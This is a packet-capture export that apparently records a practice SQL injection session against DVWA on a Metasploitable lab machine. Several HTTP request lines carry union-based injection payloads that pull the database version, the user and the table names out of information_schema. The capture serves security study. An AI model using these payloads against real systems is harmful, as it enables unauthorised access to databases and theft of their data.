"No.","Time","Source","Destination","Protocol","Length","Info"
"126","69.040883857","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=522 Ack=4345 Win=31872 Len=0 TSval=3495337353 TSecr=32800"
"127","69.041143240","10.0.2.4","10.0.2.5","HTTP","548","HTTP/1.1 200 OK  (text/html)"
"128","69.041145155","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495337353 TSecr=32800"
"129","69.043771971","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [FIN, ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495337356 TSecr=32800"
"130","69.044294022","10.0.2.4","10.0.2.5","TCP","66","80  >  52290 [FIN, ACK] Seq=4827 Ack=523 Win=6912 Len=0 TSval=32801 TSecr=3495337356"
"131","69.044312174","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=523 Ack=4828 Win=31872 Len=0 TSval=3495337356 TSecr=32801"
"132","117.784456256","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"133","117.784574570","10.0.2.5","34.107.243.93","TCP","54","57910  >  443 [ACK] Seq=1 Ack=25 Win=31616 Len=0"
"134","117.785042555","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"135","117.943116103","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=25 Ack=29 Win=32606 Len=0"
"136","122.931166137","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"137","122.931385482","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
"138","140.256051300","10.0.2.5","10.0.2.4","TCP","74","35960  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495408568 TSecr=0 WS=128"
"139","140.256674175","10.0.2.4","10.0.2.5","TCP","74","80  >  35960 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=39920 TSecr=3495408568 WS=128"
"140","140.256706305","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495408568 TSecr=39920"
"141","140.257524086","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+@@version,2--+&Submit=Submit HTTP/1.1 "
"142","140.257981441","10.0.2.4","10.0.2.5","TCP","66","80  >  35960 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=39920 TSecr=3495408569"
"143","140.266167104","10.0.2.4","10.0.2.5","TCP","2962","80  >  35960 [ACK] Seq=1 Ack=530 Win=6912 Len=2896 TSval=39921 TSecr=3495408569 [TCP segment of a reassembled PDU]"
"144","140.266194594","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=530 Ack=2897 Win=31872 Len=0 TSval=3495408578 TSecr=39921"
"145","140.266374865","10.0.2.4","10.0.2.5","TCP","1514","80  >  35960 [ACK] Seq=2897 Ack=530 Win=6912 Len=1448 TSval=39921 TSecr=3495408569 [TCP segment of a reassembled PDU]"
"146","140.266377762","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495408578 TSecr=39921"
"147","140.266738041","10.0.2.4","10.0.2.5","HTTP","579","HTTP/1.1 200 OK  (text/html)"
"148","140.266739812","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495408579 TSecr=39921"
"149","140.269052272","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [FIN, ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495408581 TSecr=39921"
"150","140.269669809","10.0.2.4","10.0.2.5","TCP","66","80  >  35960 [FIN, ACK] Seq=4858 Ack=531 Win=6912 Len=0 TSval=39922 TSecr=3495408581"
"151","140.269677022","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=531 Ack=4859 Win=31872 Len=0 TSval=3495408581 TSecr=39922"
"152","145.459853996","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"153","145.460466647","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"154","200.007609664","10.0.2.5","10.0.2.4","TCP","74","47016  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495468319 TSecr=0 WS=128"
"155","200.008151905","10.0.2.4","10.0.2.5","TCP","74","80  >  47016 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=45894 TSecr=3495468319 WS=128"
"156","200.008180860","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495468320 TSecr=45894"
"157","200.010521062","10.0.2.5","10.0.2.4","HTTP","594","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+@@dbname,2--+&Submit=Submit HTTP/1.1 "
"158","200.011009032","10.0.2.4","10.0.2.5","TCP","66","80  >  47016 [ACK] Seq=1 Ack=529 Win=6912 Len=0 TSval=45894 TSecr=3495468322"
"159","200.018912920","10.0.2.4","10.0.2.5","HTTP","478","HTTP/1.1 200 OK  (text/html)"
"160","200.018942658","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [ACK] Seq=529 Ack=413 Win=31872 Len=0 TSval=3495468331 TSecr=45895"
"161","201.021551126","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [FIN, ACK] Seq=529 Ack=413 Win=31872 Len=0 TSval=3495469333 TSecr=45895"
"162","201.022234186","10.0.2.4","10.0.2.5","TCP","66","80  >  47016 [FIN, ACK] Seq=413 Ack=530 Win=6912 Len=0 TSval=45995 TSecr=3495469333"
"163","201.022263961","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [ACK] Seq=530 Ack=414 Win=31872 Len=0 TSval=3495469334 TSecr=45995"
"164","231.677339139","10.0.2.5","10.0.2.4","TCP","74","55216  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495499989 TSecr=0 WS=128"
"165","231.677961276","10.0.2.4","10.0.2.5","TCP","74","80  >  55216 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=49060 TSecr=3495499989 WS=128"
"166","231.677973708","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495499990 TSecr=49060"
"167","231.679436992","10.0.2.5","10.0.2.4","HTTP","587","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+1,2--+&Submit=Submit HTTP/1.1 "
"168","231.679930736","10.0.2.4","10.0.2.5","TCP","66","80  >  55216 [ACK] Seq=1 Ack=522 Win=6912 Len=0 TSval=49060 TSecr=3495499991"
"169","231.687502688","10.0.2.4","10.0.2.5","TCP","4410","80  >  55216 [ACK] Seq=1 Ack=522 Win=6912 Len=4344 TSval=49061 TSecr=3495499991 [TCP segment of a reassembled PDU]"
"170","231.687510448","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=522 Ack=4345 Win=31872 Len=0 TSval=3495499999 TSecr=49061"
"171","231.687991474","10.0.2.4","10.0.2.5","HTTP","548","HTTP/1.1 200 OK  (text/html)"
"172","231.687995985","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495500000 TSecr=49061"
"173","231.689123825","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [FIN, ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495500001 TSecr=49061"
"174","231.689814654","10.0.2.4","10.0.2.5","TCP","66","80  >  55216 [FIN, ACK] Seq=4827 Ack=523 Win=6912 Len=0 TSval=49061 TSecr=3495500001"
"175","231.689819938","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=523 Ack=4828 Win=31872 Len=0 TSval=3495500002 TSecr=49061"
"176","239.586473143","10.0.2.5","10.0.2.4","TCP","74","40524  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495507898 TSecr=0 WS=128"
"177","239.587115957","10.0.2.4","10.0.2.5","TCP","74","80  >  40524 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=49851 TSecr=3495507898 WS=128"
"178","239.587128842","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495507899 TSecr=49851"
"179","239.588327335","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+'testing',2--+&Submit=Submit HTTP/1.1 "
"180","239.588949897","10.0.2.4","10.0.2.5","TCP","66","80  >  40524 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=49851 TSecr=3495507900"
"181","239.596385369","10.0.2.4","10.0.2.5","TCP","2962","80  >  40524 [ACK] Seq=1 Ack=530 Win=6912 Len=2896 TSval=49851 TSecr=3495507900 [TCP segment of a reassembled PDU]"
"182","239.596395486","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=2897 Win=31872 Len=0 TSval=3495507908 TSecr=49851"
"183","239.596542351","10.0.2.4","10.0.2.5","TCP","1514","80  >  40524 [ACK] Seq=2897 Ack=530 Win=6912 Len=1448 TSval=49852 TSecr=3495507900 [TCP segment of a reassembled PDU]"
"184","239.596545249","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495507908 TSecr=49852"
"185","239.596901916","10.0.2.4","10.0.2.5","HTTP","570","HTTP/1.1 200 OK  (text/html)"
"186","239.596904377","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=4849 Win=31872 Len=0 TSval=3495507909 TSecr=49852"
"187","239.597852621","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [FIN, ACK] Seq=530 Ack=4849 Win=31872 Len=0 TSval=3495507910 TSecr=49852"
"188","239.598464947","10.0.2.4","10.0.2.5","TCP","66","80  >  40524 [FIN, ACK] Seq=4849 Ack=531 Win=6912 Len=0 TSval=49852 TSecr=3495507910"
"189","239.598471638","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=531 Ack=4850 Win=31872 Len=0 TSval=3495507910 TSecr=49852"
"190","250.464982515","10.0.2.5","10.0.2.4","TCP","74","39818  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495518777 TSecr=0 WS=128"
"191","250.465528342","10.0.2.4","10.0.2.5","TCP","74","80  >  39818 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=50938 TSecr=3495518777 WS=128"
"192","250.465541783","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495518777 TSecr=50938"
"193","250.468183784","10.0.2.5","10.0.2.4","HTTP","592","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+@@user,2--+&Submit=Submit HTTP/1.1 "
"194","250.468746577","10.0.2.4","10.0.2.5","TCP","66","80  >  39818 [ACK] Seq=1 Ack=527 Win=6912 Len=0 TSval=50939 TSecr=3495518780"
"195","250.476401546","10.0.2.4","10.0.2.5","HTTP","476","HTTP/1.1 200 OK  (text/html)"
"196","250.476420439","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=527 Ack=411 Win=31872 Len=0 TSval=3495518788 TSecr=50939"
"197","251.479561881","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [FIN, ACK] Seq=527 Ack=411 Win=31872 Len=0 TSval=3495519791 TSecr=50939"
"198","251.480175408","10.0.2.4","10.0.2.5","TCP","66","80  >  39818 [FIN, ACK] Seq=411 Ack=528 Win=6912 Len=0 TSval=51040 TSecr=3495519791"
"199","251.480479712","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=528 Ack=412 Win=31872 Len=0 TSval=3495519792 TSecr=51040"
"200","260.721487427","10.0.2.5","10.0.2.4","TCP","74","59766  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495529033 TSecr=0 WS=128"
"201","260.722015594","10.0.2.4","10.0.2.5","TCP","74","80  >  59766 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=51964 TSecr=3495529033 WS=128"
"202","260.722046924","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495529034 TSecr=51964"
"203","260.724603754","10.0.2.5","10.0.2.4","HTTP","594","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+dbname(),2--+&Submit=Submit HTTP/1.1 "
"204","260.725474727","10.0.2.4","10.0.2.5","TCP","66","80  >  59766 [ACK] Seq=1 Ack=529 Win=6912 Len=0 TSval=51964 TSecr=3495529036"
"205","260.732384134","10.0.2.4","10.0.2.5","HTTP","481","HTTP/1.1 200 OK  (text/html)"
"206","260.732412794","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=529 Ack=416 Win=31872 Len=0 TSval=3495529044 TSecr=51964"
"207","261.735458120","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [FIN, ACK] Seq=529 Ack=416 Win=31872 Len=0 TSval=3495530047 TSecr=51964"
"208","261.736928076","10.0.2.4","10.0.2.5","TCP","66","80  >  59766 [FIN, ACK] Seq=416 Ack=530 Win=6912 Len=0 TSval=52065 TSecr=3495530047"
"209","261.736962433","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=530 Ack=417 Win=31872 Len=0 TSval=3495530049 TSecr=52065"
"210","347.770855128","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"211","347.770855387","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"212","361.893293434","10.0.2.5","172.31.1.130","DNS","84","Standard query 0xd016 A perfdata.portswigger.net"
"213","361.893563455","10.0.2.5","172.31.1.130","DNS","84","Standard query 0x5114 AAAA perfdata.portswigger.net"
"214","361.910748627","172.31.1.130","10.0.2.5","DNS","429","Standard query response 0xd016 A perfdata.portswigger.net A 34.241.103.101 A 52.212.154.154 NS ns-1337.awsdns-39.org NS ns-194.awsdns-24.com NS ns-573.awsdns-07.net NS ns-1955.awsdns-52.co.uk A 205.251.197.57 A 205.251.192.194 A 205.251.199.163 A 205.251.194.61 AAAA 2600:9000:5305:3900::1 AAAA 2600:9000:5300:c200::1 AAAA 2600:9000:5307:a300::1 AAAA 2600:9000:5302:3d00::1"
"215","361.910748681","172.31.1.130","10.0.2.5","DNS","165","Standard query response 0x5114 AAAA perfdata.portswigger.net SOA ns-573.awsdns-07.net"
"216","361.911508366","10.0.2.5","34.241.103.101","TCP","74","33092  >  443 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3429561796 TSecr=0 WS=128"
"217","361.983300619","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0x8e4a6e80"
"218","361.985703639","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0x8e4a6e80"
"219","362.072508321","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [SYN, ACK] Seq=0 Ack=1 Win=32768 Len=0 MSS=1460"
"220","362.072548820","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"221","362.081791244","10.0.2.5","34.241.103.101","TLSv1.2","559","Client Hello"
"222","362.243690375","34.241.103.101","10.0.2.5","TLSv1.2","2974","Server Hello"
"223","362.243728054","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=2921 Win=30660 Len=0"
"224","362.244137880","34.241.103.101","10.0.2.5","TCP","1514","443  >  33092 [PSH, ACK] Seq=2921 Ack=506 Win=32263 Len=1460 [TCP segment of a reassembled PDU]"
"225","362.244147427","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=4381 Win=30660 Len=0"
"226","362.244835214","34.241.103.101","10.0.2.5","TLSv1.2","1080","Certificate, Server Key Exchange, Server Hello Done"
"227","362.244854438","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=5407 Win=30660 Len=0"
"228","362.253344700","10.0.2.5","34.241.103.101","TLSv1.2","129","Client Key Exchange"
"229","362.315032459","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5407 Ack=581 Win=32188 Len=0"
"230","362.315071047","10.0.2.5","34.241.103.101","TLSv1.2","105","Change Cipher Spec, Encrypted Handshake Message"
"231","362.475957287","34.241.103.101","10.0.2.5","TLSv1.2","258","New Session Ticket, Change Cipher Spec, Encrypted Handshake Message"
"232","362.476966538","10.0.2.5","34.241.103.101","TLSv1.2","985","Application Data"
"233","362.565722239","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5611 Ack=1563 Win=32768 Len=0"
"234","362.669600181","34.241.103.101","10.0.2.5","TLSv1.2","237","Application Data"
"235","362.669600503","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [FIN, ACK] Seq=5794 Ack=1563 Win=32768 Len=0"
"236","362.671560563","10.0.2.5","34.241.103.101","TLSv1.2","85","Encrypted Alert"
"237","362.672052413","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [FIN, ACK] Seq=1594 Ack=5795 Win=30660 Len=0"
"238","362.672706991","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5795 Ack=1595 Win=32736 Len=0"
"239","367.155508655","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"240","367.155847236","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"241","401.275127279","10.0.2.5","10.0.2.4","TCP","74","36916  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495669587 TSecr=0 WS=128"
"242","401.283160103","PcsCompu_a3:ab:42","Broadcast","ARP","60","Who has 10.0.2.5? Tell 10.0.2.4"
"243","401.283169627","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","10.0.2.5 is at 08:00:27:c9:93:64"
"244","401.283607292","10.0.2.4","10.0.2.5","TCP","74","80  >  36916 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=66016 TSecr=3495669587 WS=128"
"245","401.283638580","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495669595 TSecr=66016"
"246","401.284092101","10.0.2.5","10.0.2.4","HTTP","671","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(table_name),2+from+information_schema.tables+where+table_schema=database()--+&Submit=Submit HTTP/1.1 "
"247","401.284552965","10.0.2.4","10.0.2.5","TCP","66","80  >  36916 [ACK] Seq=1 Ack=606 Win=7040 Len=0 TSval=66017 TSecr=3495669596"
